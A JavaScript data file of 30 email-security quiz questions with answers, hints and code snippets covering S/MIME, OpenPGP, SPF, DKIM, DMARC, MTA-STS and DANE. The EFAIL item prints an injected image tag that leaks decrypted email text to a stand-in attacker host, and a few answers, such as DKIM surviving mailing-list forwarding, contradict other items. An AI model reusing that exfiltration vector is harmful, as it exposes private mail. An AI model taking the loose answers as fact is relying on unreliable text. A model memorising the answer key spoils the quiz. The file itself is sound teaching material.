const questions = [
  {
    id: 1,
    question: "What is the fundamental architectural difference between Hop-by-Hop Transport Encryption (STARTTLS) and End-to-End Email Encryption (S/MIME or OpenPGP)?",
    shortAnswer: "STARTTLS encrypts the transmission channel only between intermediate mail servers (MTA to MTA); emails are decrypted to plaintext in memory and on disk at every hop. S/MIME and OpenPGP encrypt the message body and attachments directly at the sender's client, keeping the data encrypted all the way until it is decrypted by the recipient's private key.",
    explanation: "Because SMTP is a store-and-forward protocol, STARTTLS provides zero protection against rogue mail server administrators, subpoena access at intermediate relays, or compromised cloud email hosting providers. End-to-End encryption guarantees confidentiality across the entire path.",
    hint: "STARTTLS protects the wire between servers; S/MIME and PGP protect the message payload itself end-to-end.",
    level: "Basic",
    codeExample: `// Hop-by-Hop vs End-to-End Comparison:
// STARTTLS : Client ──(TLS)──> Server A [Plaintext in RAM/Disk!] ──(TLS)──> Server B [Plaintext!] ──(TLS)──> Recipient
// S/MIME   : Client ──[🔒 Encrypted Payload (AES-256)]──(Passes opaque across all servers)──> Recipient (Decrypts with Private Key)`
  },
  {
    id: 2,
    question: "What is the primary difference in Trust Models between S/MIME (RFC 8551) and OpenPGP / GPG (RFC 4880)?",
    shortAnswer: "S/MIME relies on a hierarchical Public Key Infrastructure (PKI) anchored in centralized Certificate Authorities (CAs); OpenPGP relies on a decentralized 'Web of Trust' (WoT) where users sign and validate each other's public key certificates directly without central authorities.",
    explanation: "S/MIME is the standard choice for enterprises and governments due to centralized policy enforcement and native support in Microsoft Outlook and Apple Mail. OpenPGP is favored by technical communities, journalists, and open-source developers who avoid centralized commercial CAs.",
    hint: "S/MIME uses central Root CAs; OpenPGP uses a peer-to-peer Web of Trust.",
    level: "Basic",
    codeExample: `// Trust Model Comparison:
// S/MIME   : Leaf Certificate ➔ Signed by Intermediate CA ➔ Signed by Trusted Root CA (e.g., DigiCert)
// OpenPGP  : Alice Key ➔ Cross-Signed by Bob (I trust Bob) ➔ Bob signed Charlie Key (Web of Trust)`
  },
  {
    id: 3,
    question: "What are the two distinct cryptographic operations involved in sending a secure email that is both 'Signed' and 'Encrypted'?",
    shortAnswer: "1. Digital Signing: The sender hashes the message body and encrypts the hash with the Sender's Private Key (providing origin authentication, integrity, and non-repudiation); 2. Asymmetric Hybrid Encryption: The sender generates a random symmetric session key (AES-256), encrypts the message + signature with it, and encrypts the session key with the Recipient's Public Key (providing confidentiality).",
    explanation: "The rule to remember: Sign with YOUR private key; Encrypt with the RECEIVER's public key.",
    hint: "Sign with sender's private key; encrypt with receiver's public key.",
    level: "Basic",
    codeExample: `// 2-Step Cryptographic Email Pipeline:
// 1. SIGNING    : Hash(Body) + Sender_Private_Key ➔ Digital Signature (Proves who wrote it)
// 2. ENCRYPTING : (Body + Signature) + AES_Key ➔ Ciphertext; AES_Key + Receiver_Public_Key ➔ Encrypted Key Blob`
  },
  {
    id: 4,
    question: "What email metadata fields remain completely visible in cleartext even when using S/MIME or OpenPGP encryption?",
    shortAnswer: "The Subject line, From address, To address, Date, Message-ID, and intermediate SMTP routing `Received:` headers.",
    explanation: "Because standard mail transfer agents (MTAs) require routing headers to deliver the email, standard S/MIME and PGP only encrypt the MIME body and attachments. The Subject line is part of the RFC 5322 header and is transmitted in plain cleartext on the wire unless Protected Headers / Memory Hole extensions are supported.",
    hint: "Subject lines, sender, recipient, and timestamps remain unencrypted.",
    level: "Moderate",
    codeExample: `// S/MIME Message on Wire:
// From: susmita@treasury.barrackpore.gov.in (Visible!)
// To: debangshu@defense.ichapur.gov.in (Visible!)
// Subject: Confidential: Pension Batch ₹75,00,000 (VISIBLE IN CLEARTEXT!)
// Content-Type: multipart/encrypted; protocol="application/pkcs7-mime"
// [ Encrypted Body Data ] (Confidential)`
  },
  {
    id: 5,
    question: "How does the Sender Policy Framework (SPF - RFC 7208) prevent email spoofing?",
    shortAnswer: "The domain owner publishes a DNS TXT record listing all IP addresses and mail servers authorized to send outbound email on behalf of that domain. The receiving mail server queries the sender's DNS during the SMTP `MAIL FROM` transaction and drops or flags messages arriving from unauthorized IP addresses.",
    explanation: "If an attacker on IP `198.51.100.99` tries to send an email claiming to be `ceo@barrackpore.gov.in`, the receiver checks `barrackpore.gov.in`'s SPF record. Since `198.51.100.99` is not listed, the SPF check returns `FAIL`.",
    hint: "A DNS record listing authorized outbound mail server IPs for the domain.",
    level: "Basic",
    codeExample: `// DNS SPF TXT Record:
// barrackpore.gov.in. IN TXT "v=spf1 ip4:203.0.113.10 include:_spf.google.com -all"
// -all = Hard fail: Reject any email from IPs not explicitly authorized!`
  },
  {
    id: 6,
    question: "How does DomainKeys Identified Mail (DKIM - RFC 6376) provide cryptographic origin authentication for emails?",
    shortAnswer: "The sending mail server hashes specific email headers and the body, encrypts the hash with its private asymmetric key, and attaches the resulting signature in a `DKIM-Signature:` header. The receiving mail server fetches the sender's public key from DNS (`selector._domainkey.domain.com`) and verifies the signature.",
    explanation: "Unlike SPF (which only checks the connecting IP), DKIM survives email forwarding through mailing lists, because the cryptographic signature travels directly inside the email headers.",
    hint: "The sending mail server digitally signs email headers; the receiver checks the public key in DNS.",
    level: "Moderate",
    codeExample: `// DKIM-Signature Header in Email:
// DKIM-Signature: v=1; a=rsa-sha256; d=barrackpore.gov.in; s=202601;
//   bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=;
//   b=d8f9b1c2d3a4... (Digital Signature over Headers & Body)`
  },
  {
    id: 7,
    question: "What is DMARC (RFC 7489) and what are its three possible policy enforcement modes (`p=none`, `p=quarantine`, `p=reject`)?",
    shortAnswer: "DMARC builds upon SPF and DKIM, requiring 'domain alignment' (matching the visible `From:` header with authenticated SPF/DKIM domains) and instructing receivers what to do on failure: `p=none` (Monitor & send reports only), `p=quarantine` (Route failed emails to Spam/Junk folder), and `p=reject` (Silently block/drop failed emails at the SMTP gateway).",
    explanation: "DMARC `p=reject` is the definitive standard to completely eliminate CEO fraud, business email compromise (BEC), and spoofed phishing emails sent under your organization's domain name.",
    hint: "Enforces policy action (none, quarantine, reject) when SPF/DKIM fail alignment.",
    level: "Moderate",
    codeExample: `// DNS DMARC TXT Record (_dmarc.barrackpore.gov.in):
// "v=DMARC1; p=reject; rua=mailto:dmarc-reports@barrackpore.gov.in; pct=100; sp=reject"
// p=reject = 100% of unaligned spoofed emails are immediately dropped by Gmail/Outlook!`
  },
  {
    id: 8,
    question: "What was the 'EFAIL' vulnerability (CVE-2017-17688 / CVE-2017-17689) in S/MIME and OpenPGP email clients?",
    shortAnswer: "EFAIL exploited CBC mode ciphertext malleability and HTML rendering in email clients. Attackers intercepted encrypted emails, injected malicious HTML image tags (`<img src=\"https://attacker.com/leak?data=\">`) into the ciphertext without breaking encryption, and re-sent it. When the victim decrypted and rendered the email, the client exfiltrated the decrypted plaintext to the attacker's server.",
    explanation: "EFAIL highlighted the danger of decrypting unauthenticated ciphertexts. The mitigation was mandating Authenticated Encryption (AEAD / MIME MDC) and disabling external HTML resource loading in email clients.",
    hint: "Manipulated CBC ciphertext to inject HTML image tags that leaked decrypted plaintext on render.",
    level: "Expert",
    codeExample: `// EFAIL Exfiltration Vector:
// Injected Ciphertext decrypts to:
// <img src="https://attacker.com/leak?data=[DECRYPTED PLAINTEXT PENSION DATA HERE]...`
  },
  {
    id: 9,
    question: "What are the standard MIME Content-Types used by S/MIME for digital signatures and encrypted messages?",
    shortAnswer: "Signed email: `multipart/signed; protocol=\"application/pkcs7-signature\"` (or `application/x-pkcs7-signature`); Encrypted email: `application/pkcs7-mime; smime-type=enveloped-data`.",
    explanation: "When receiving an S/MIME message, the email client inspects these MIME content-types to invoke the cryptographic PKCS#7 / CMS (Cryptographic Message Syntax) parsing engine.",
    hint: "multipart/signed with pkcs7-signature and application/pkcs7-mime.",
    level: "Moderate",
    codeExample: `// S/MIME MIME Headers:
// Content-Type: multipart/signed; protocol="application/pkcs7-signature"; micalg=sha256; boundary="----boundary123"
// Or for encrypted:
// Content-Type: application/pkcs7-mime; smime-type=enveloped-data; name="smime.p7m"`
  },
  {
    id: 10,
    question: "How does OpenPGP implement 'Detached Signatures' and why are they useful in software distribution?",
    shortAnswer: "A detached signature stores the digital signature in a completely separate file (e.g., `software.tar.gz.asc` or `software.tar.gz.sig`) rather than bundling it inside the archive. This allows users to download and verify the authenticity and integrity of huge multi-gigabyte software releases without modifying the original binary archive.",
    explanation: "Linux distributions, Apache projects, and OpenSSL publish detached GPG signatures alongside release tarballs so users can verify `gpg --verify software.tar.gz.asc software.tar.gz`.",
    hint: "A signature stored in a separate .sig/.asc file to verify software archives without modifying the file.",
    level: "Moderate",
    codeExample: `// Verifying Detached GPG Signature:
# gpg --verify strongswan-5.9.14.tar.bz2.sig strongswan-5.9.14.tar.bz2
// Output: gpg: Good signature from "strongSwan Release Signing Key <info@strongswan.org>"`
  },
  {
    id: 11,
    question: "What is an OpenPGP 'Revocation Certificate' and why must it be generated immediately when creating a new GPG key pair?",
    shortAnswer: "A Revocation Certificate is a small pre-generated cryptographic token that revokes a public key on public keyservers if the private key is ever lost, stolen, or the passphrase forgotten. It must be generated in advance because if the private key is lost, you can no longer create a revocation signature.",
    explanation: "Administrators store the revocation certificate in a secure offline location (e.g., printed on paper or on an encrypted air-gapped flash drive).",
    hint: "A pre-generated file used to revoke your public key if you ever lose your private key.",
    level: "Basic",
    codeExample: `// Generating OpenPGP Revocation Certificate:
# gpg --output susmita_revocation.asc --gen-revoke susmita@barrackpore.gov.in
// Stored offline in secure vault in case of laptop theft.`
  },
  {
    id: 12,
    question: "What is BIMI (Brand Indicators for Message Identification) and how does it integrate with DMARC?",
    shortAnswer: "BIMI is an email standard that allows organizations that have enforced strict DMARC (`p=quarantine` or `p=reject`) and obtained a Verified Mark Certificate (VMC) to display their official verified brand logo next to incoming emails in user inboxes (e.g., in Gmail, Apple Mail).",
    explanation: "BIMI incentivizes organizations to deploy strict DMARC anti-spoofing controls by rewarding them with visual branding and increased user trust in email clients.",
    hint: "Displays verified company logos in email inboxes for domains with strict DMARC.",
    level: "Moderate",
    codeExample: `// DNS BIMI Record (default._bimi.barrackpore.gov.in):
// "v=BIMI1; l=https://barrackpore.gov.in/logo.svg; a=https://barrackpore.gov.in/vmc.pem"`
  },
  {
    id: 13,
    question: "What is Authenticated Received Chain (ARC - RFC 8617) and what email forwarding issue does it resolve?",
    shortAnswer: "When an email is forwarded through an intermediary (such as a university mailing list or ticketing system), the forwarder rewrites headers, breaking SPF and DKIM. ARC preserves the initial authentication results across hops by attaching cryptographically signed `ARC-Seal` and `ARC-Authentication-Results` headers.",
    explanation: "ARC allows downstream receivers (like Gmail) to verify that an email originally passed SPF and DKIM before it passed through a trusted intermediate mailing list.",
    hint: "Preserves SPF/DKIM verification status when emails pass through mailing lists and forwarders.",
    level: "Expert",
    codeExample: `// ARC Headers Added by Intermediate Mailing List:
// ARC-Authentication-Results: i=1; mx.google.com; dkim=pass header.i=@barrackpore.gov.in; spf=pass
// ARC-Message-Signature: i=1; a=rsa-sha256; d=jadavpur.ac.in; ...
// ARC-Seal: i=1; a=rsa-sha256; d=jadavpur.ac.in; s=arc2026; cv=none; b=...`
  },
  {
    id: 14,
    question: "What is the function of the S/MIME Certificate Revocation List (CRL) Distribution Point (CDP) and OCSP in corporate email?",
    shortAnswer: "When an email client receives an S/MIME signed email, it queries the CRL or OCSP responder URL embedded in the sender's X.509 certificate to ensure the certificate has not been revoked (e.g., due to employee termination or private key compromise) before displaying a trusted padlock.",
    explanation: "If a compromised certificate is revoked at the municipal CA in Barrackpore, all email clients immediately flag emails signed by that key as untrusted.",
    hint: "Checks in real time if an employee's digital signature certificate has been revoked.",
    level: "Moderate",
    codeExample: `// Certificate Extension for Revocation:
// X509v3 CRL Distribution Points:
//   URI: http://crl.barrackpore.gov.in/pki/treasury.crl
// Authority Information Access:
//   OCSP - URI: http://ocsp.barrackpore.gov.in`
  },
  {
    id: 15,
    question: "Why does S/MIME natively integrate with Microsoft Outlook and iOS Mail whereas PGP requires third-party plugins (like GPG Suite / Enigmail)?",
    shortAnswer: "S/MIME is built into the operating system and enterprise trust stores (Windows CryptoAPI / Apple Keychain), utilizing standardized X.509 certificates that corporate MDMs (Mobile Device Management) can provision automatically; OpenPGP uses a separate keyring architecture not natively bundled into consumer OS trust stores.",
    explanation: "This native integration makes S/MIME the primary protocol for corporate and government compliance, while PGP remains popular for cross-platform open-source software developers.",
    hint: "S/MIME uses OS certificate stores; PGP requires separate software and keyrings.",
    level: "Basic",
    codeExample: `// Enterprise S/MIME Deployment:
// Active Directory Group Policy automatically enrolls user X.509 cert in Windows Certificate Store.
// Outlook detects cert automatically ➔ User clicks 'Encrypt' with zero manual key import.`
  },
  {
    id: 16,
    question: "What is an OpenPGP 'Key Server' and how do users publish and retrieve public keys using keyserver protocols (HKP / WKD)?",
    shortAnswer: "An OpenPGP keyserver (e.g., `keys.openpgp.org`) is a public directory where users upload public key certificates indexed by email and 40-character fingerprint. Web Key Directory (WKD) is a modern decentralized standard allowing domains to host keys directly via HTTPS at `https://domain.com/.well-known/openpgpkey/`.",
    explanation: "WKD guarantees that only the legitimate domain administrator can publish keys for `@domain.com`, eliminating rogue keyserver spoofing.",
    hint: "A directory for discovering public keys; WKD hosts keys directly under the organization's domain.",
    level: "Expert",
    codeExample: `// Fetching Key via GPG:
# gpg --keyserver hkps://keys.openpgp.org --recv-keys 88AF1901B3C499E14A1F89BC99E188AF1901B3C4
// Or automatic WKD lookup:
# gpg --locate-keys susmita@barrackpore.gov.in`
  },
  {
    id: 17,
    question: "What is the 'Modification Detection Code' (MDC) in OpenPGP (RFC 4880) and why is it mandatory for secure encryption?",
    shortAnswer: "The MDC is a SHA-1/SHA-256 integrity checksum appended to encrypted OpenPGP packets (`Symmetrically Encrypted and Integrity Protected Data Packet`). It ensures that any tampering with the ciphertext is detected before decryption, preventing chosen-ciphertext and CBC malleability attacks.",
    explanation: "Decryption of packets without MDC (legacy raw encryption) is disabled in modern GnuPG to prevent EFAIL-style attacks.",
    hint: "An integrity hash inside the encrypted packet to prevent ciphertext tampering.",
    level: "Expert",
    codeExample: `// GnuPG Warning on Missing MDC:
// gpg: WARNING: message was not integrity protected (Missing MDC!)
// gpg: decryption failed: Bad integrity check`
  },
  {
    id: 18,
    question: "How does OpenPGP 'Key Signing' (Web of Trust) build transitive trust between two individuals who have never met?",
    shortAnswer: "If Alice fully trusts Bob, and Bob has verified and digitally signed Charlie's public key (e.g., at a key signing party after checking government photo ID), Alice's GPG client automatically considers Charlie's public key valid because of the trusted signature chain.",
    explanation: "The Web of Trust replaces centralized Certificate Authorities with peer endorsement. GPG allows configuring trust levels: Unknown, None, Marginal, and Full.",
    hint: "Alice trusts Bob; Bob signs Charlie; Alice's software automatically trusts Charlie.",
    level: "Moderate",
    codeExample: `// OpenPGP Key Signing Command:
# gpg --sign-key debangshu@defense.ichapur.gov.in
// Proves: "I, Susmita, verified Debangshu's fingerprint in person."`
  },
  {
    id: 19,
    question: "What is an S/MIME 'Dual-Key System' and why do enterprise security policies require separate keys for Signing versus Encryption?",
    shortAnswer: "Signing keys require strict non-repudiation (private key must NEVER be backed up or escrowed, known only to the user); Encryption keys require key escrow/archival so the enterprise can recover critical business emails if the employee leaves or loses their key.",
    explanation: "If an encryption private key is lost without escrow, all past corporate encrypted emails are permanently unrecoverable.",
    hint: "Signing keys must never be escrowed (non-repudiation); encryption keys must be escrowed for data recovery.",
    level: "Expert",
    codeExample: `// Enterprise Dual Certificate Setup:
// Cert 1: S/MIME Signature Only (Key Usage: Digital Signature, Non-Repudiation) ➔ Stored on User Hardware Token
// Cert 2: S/MIME Encryption Only (Key Usage: Key Encipherment) ➔ Escrowed in Secure Enterprise Key Vault`
  },
  {
    id: 20,
    question: "How can an administrator inspect the DKIM signature of an incoming email header using standard command-line tools?",
    shortAnswer: "By examining the raw RFC 5322 header and locating the `DKIM-Signature:` field, which specifies the signing domain (`d=`), key selector (`s=`), algorithm (`a=rsa-sha256`), header list (`h=`), body hash (`bh=`), and signature (`b=`).",
    explanation: "Security analysts verify whether `d=` matches the `From:` header domain to ensure DMARC alignment.",
    hint: "Look for the DKIM-Signature header in raw email headers.",
    level: "Basic",
    codeExample: `// Raw DKIM Header Dissection:
// DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
//   d=barrackpore.gov.in; s=202601; t=1724410800;
//   h=from:to:subject:date:message-id;
//   bh=47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=;
//   b=d8f9b1c2... (Cryptographic Signature)`
  },
  {
    id: 21,
    question: "What is DMARC 'Domain Alignment' and what is the difference between Strict Alignment and Relaxed Alignment?",
    shortAnswer: "Domain alignment requires that the domain in the visible `From:` header matches the domain authenticated by SPF (`Return-Path`) or DKIM (`d=`). 'Relaxed' alignment allows subdomains (e.g., `mail.barrackpore.gov.in` matches `barrackpore.gov.in`); 'Strict' alignment requires an exact character-for-character match.",
    explanation: "Configured via `aspf=r` (Relaxed SPF) or `aspf=s` (Strict SPF) and `adkim=r` / `adkim=s` in the DMARC TXT record.",
    hint: "Relaxed allows subdomains; strict requires exact domain matching.",
    level: "Moderate",
    codeExample: `// DMARC Alignment Settings:
// aspf=r ➔ Relaxed SPF (sub.domain.com matches domain.com)
// aspf=s ➔ Strict SPF (sub.domain.com FAILS alignment with domain.com)`
  },
  {
    id: 22,
    question: "What is S/MIME v4.0 (RFC 8551) and what modern cryptographic ciphers does it mandate?",
    shortAnswer: "S/MIME v4.0 mandates Authenticated Encryption with Associated Data (AEAD) using AES-256-GCM and ChaCha20-Poly1305, deprecates weak SHA-1 and 3DES algorithms, and supports modern elliptic curve cryptography (ECDSA and Ed25519).",
    explanation: "RFC 8551 upgraded email security to match modern TLS 1.3 cryptographic standards, eliminating legacy CBC padding vulnerabilities.",
    hint: "Mandates AEAD AES-GCM and ChaCha20-Poly1305, eliminating legacy 3DES and SHA-1.",
    level: "Moderate",
    codeExample: `// Modern S/MIME 4.0 Suite:
// Symmetric Encryption : AES-256-GCM / ChaCha20-Poly1305
// Asymmetric Key Wrap  : RSA-OAEP (3072b+) / ECDH (Curve25519 / P-384)
// Digital Signature    : RSA-PSS / Ed25519`
  },
  {
    id: 23,
    question: "What is GnuPG's `gpg-agent` and how does it manage encrypted private key passphrases?",
    shortAnswer: "`gpg-agent` is a background daemon that handles private key management and caches passphrases in memory for a configurable TTL (e.g., 600 seconds), displaying graphical pinentry dialogs when signing or decrypting files.",
    explanation: "This allows developers and administrators to sign Git commits and encrypt emails seamlessly without entering their passphrase for every single operation.",
    hint: "A background cache daemon that remembers GPG passphrases for a set timeout.",
    level: "Basic",
    codeExample: `// ~/.gnupg/gpg-agent.conf:
default-cache-ttl 600       # Cache passphrase for 10 minutes
max-cache-ttl 7200          # Maximum cache duration 2 hours
pinentry-program /usr/bin/pinentry-curses`
  },
  {
    id: 24,
    question: "Why does email encryption alone NOT prevent phishing attacks, and why are SPF/DKIM/DMARC necessary complements?",
    shortAnswer: "Encryption only guarantees that the recipient can read the message without eavesdropping; an attacker can easily generate their own valid PGP key or S/MIME certificate for a spoofed address (e.g., `ceo@barrackpore.gov.in`) and send an encrypted phishing email. SPF/DKIM/DMARC verify whether the sender is legitimately authorized by the domain owner to send mail.",
    explanation: "Email security requires both End-to-End Content Cryptography (S/MIME/PGP) and Domain Identity Governance (SPF/DKIM/DMARC).",
    hint: "Anyone can encrypt an email; SPF/DKIM/DMARC prove the sender is authorized to use the domain name.",
    level: "Moderate",
    codeExample: `// The Complete Email Defense Stack:
// 1. Content Security (S/MIME / PGP) ➔ Encryption & Digital Signatures (Confidentiality & Non-repudiation)
// 2. Domain Identity (SPF / DKIM / DMARC) ➔ Sender Validation & Spoofing Defense (Anti-Phishing)`
  },
  {
    id: 25,
    question: "What is an OpenPGP 'Subkey' and why are primary keys kept offline while subkeys are used for daily signing and encryption?",
    shortAnswer: "A primary key (Certify [C]) is kept in an offline, air-gapped vault to sign subkeys and revoke keys; separate subordinate subkeys are generated for daily Signing [S], Encryption [E], and Authentication [A] on laptops. If a laptop is stolen in Barrackpore, only the subkey is revoked without destroying the user's primary identity and Web of Trust reputation.",
    explanation: "This key architecture is the gold standard for GPG security, preventing catastrophic loss of primary identity keys.",
    hint: "Master key stays offline in a vault; disposable subkeys are used on laptops for daily signing/encrypting.",
    level: "Expert",
    codeExample: `// GPG Key Hierarchy:
// sec#  ed25519 2026-01-01 [C] (Master Key - Offline!)
// ssb>  ed25519 2026-01-01 [S] (Signing Subkey - on laptop)
// ssb>  cv25519 2026-01-01 [E] (Encryption Subkey - on laptop)
// ssb>  ed25519 2026-01-01 [A] (SSH Auth Subkey - on laptop)`
  },
  {
    id: 26,
    question: "What is MTA-STS (Mail Transfer Agent Strict Transport Security - RFC 8461)?",
    shortAnswer: "MTA-STS is a standard that allows domain owners to publish a policy via HTTPS (`https://mta-sts.domain.com/.well-known/mta-sts.txt`) declaring that all incoming SMTP traffic must use TLS with valid certificates, preventing Man-in-the-Middle attackers from downgrading STARTTLS connections to cleartext (STRIPTLS attacks).",
    explanation: "MTA-STS acts like HSTS for email transport, neutralizing opportunistic TLS stripping attacks on port 25.",
    hint: "Like HSTS for email: forces sending mail servers to use TLS and reject cleartext.",
    level: "Expert",
    codeExample: `// MTA-STS Policy File (https://mta-sts.barrackpore.gov.in/.well-known/mta-sts.txt):
version: STSv1
mode: enforce
mx: mail.barrackpore.gov.in
max_age: 604800`
  },
  {
    id: 27,
    question: "What is DANE for SMTP (RFC 7672) and how does it use DNSSEC to authenticate mail server certificates?",
    shortAnswer: "DANE (DNS-based Authentication of Named Entities) publishes TLSA records in DNSSEC-signed zones specifying the exact certificate or public key hash of the mail server on Port 25. Sending MTAs verify the server's TLS certificate against the TLSA DNSSEC record, making certificate spoofing mathematically impossible even if a public CA is compromised.",
    explanation: "DANE eliminates reliance on centralized public Web PKI Certificate Authorities for SMTP encryption.",
    hint: "Uses DNSSEC TLSA records to pin mail server TLS certificates on Port 25.",
    level: "Expert",
    codeExample: `// DNS TLSA Record (_25._tcp.mail.barrackpore.gov.in):
// IN TLSA 3 1 1 88af1901b3c499e14a1f89bc99e188af1901b3c499e188af1901b3c499e188af`
  },
  {
    id: 28,
    question: "How can a user encrypt a file using GnuPG with symmetric AES-256 encryption without requiring public key pairs?",
    shortAnswer: "By running `gpg --symmetric --cipher-algo AES256 filename.txt` (or `gpg -c filename.txt`), which prompts for a strong passphrase and encrypts the file directly using AES-256 with key derivation (S2K / Argon2/SCRYPT).",
    explanation: "This is ideal for encrypting local confidential files, backups, and archives for personal storage.",
    hint: "Use gpg --symmetric --cipher-algo AES256 filename.",
    level: "Basic",
    codeExample: `// Symmetric File Encryption:
# gpg --symmetric --cipher-algo AES256 pension_records.csv
// Outputs: pension_records.csv.gpg (Encrypted with passphrase)`
  },
  {
    id: 29,
    question: "What is an S/MIME 'Receipt' (RFC 2634) and how does it provide cryptographic Proof of Delivery?",
    shortAnswer: "An S/MIME signed receipt is an automated cryptographic confirmation generated by the recipient's email client upon successful decryption and signature verification, which is digitally signed by the recipient and returned to the sender as non-repudiable legal proof that the email was opened.",
    explanation: "This provides legal and regulatory proof in government and legal proceedings (such as tax notices and legal tenders in West Bengal).",
    hint: "A digitally signed confirmation returned by the recipient proving the email was decrypted.",
    level: "Moderate",
    codeExample: `// S/MIME Signed Receipt Mechanism:
// 1. Sender sends email with 'Receipt-Request' attribute in S/MIME signature
// 2. Recipient decrypts email ➔ Client generates Signed Receipt
// 3. Recipient's Private Key signs the receipt ➔ Returned to sender as legal proof ✔`
  },
  {
    id: 30,
    question: "What are the primary diagnostic commands to audit SPF, DKIM, and DMARC DNS records for a domain using `dig`?",
    shortAnswer: "1. Check SPF: `dig TXT domain.com +short`; 2. Check DMARC: `dig TXT _dmarc.domain.com +short`; 3. Check DKIM: `dig TXT selector._domainkey.domain.com +short`; 4. Check MTA-STS: `dig TXT _mta-sts.domain.com +short`.",
    explanation: "These DNS queries allow security auditors to immediately verify whether an organization has properly published its anti-spoofing policies.",
    hint: "Use dig TXT for domain, _dmarc.domain, and selector._domainkey.domain.",
    level: "Basic",
    codeExample: `// DNS Forensic Audit Commands:
# dig TXT barrackpore.gov.in +short
# dig TXT _dmarc.barrackpore.gov.in +short
# dig TXT 202601._domainkey.barrackpore.gov.in +short
# dig TXT _mta-sts.barrackpore.gov.in +short`
  }
];

export default questions;
